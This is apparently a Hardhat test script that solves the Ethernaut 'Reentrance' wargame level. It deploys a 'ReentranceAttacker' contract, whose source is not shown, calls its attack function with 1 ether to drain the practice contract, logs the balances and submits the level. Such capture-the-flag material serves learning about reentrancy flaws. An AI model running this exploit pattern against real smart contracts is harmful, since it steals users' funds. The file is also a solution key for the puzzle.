const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, attacker, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge(
        "0x2a24869323C0B13Dff24E196Ba072dC790D52479",
        ethers.utils.parseEther("1")
    )
    challenge = await ethers.getContractAt("Reentrance", challengeAddress)

    const attackerFactory = await ethers.getContractFactory("ReentranceAttacker")
    attacker = await attackerFactory.deploy(challenge.address)
})

it("solves the challenge", async function () {
    tx = await attacker.attack({ value: ethers.utils.parseEther("1") })
    await tx.wait()

    console.log(
        "Reentrance contract balance: ",
        ethers.utils.formatEther(await challenge.balances(challenge.address))
    )

    console.log(
        "Attacker balance in ETH: ",
        ethers.utils.formatEther(await challenge.balances(attacker.address))
    )
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
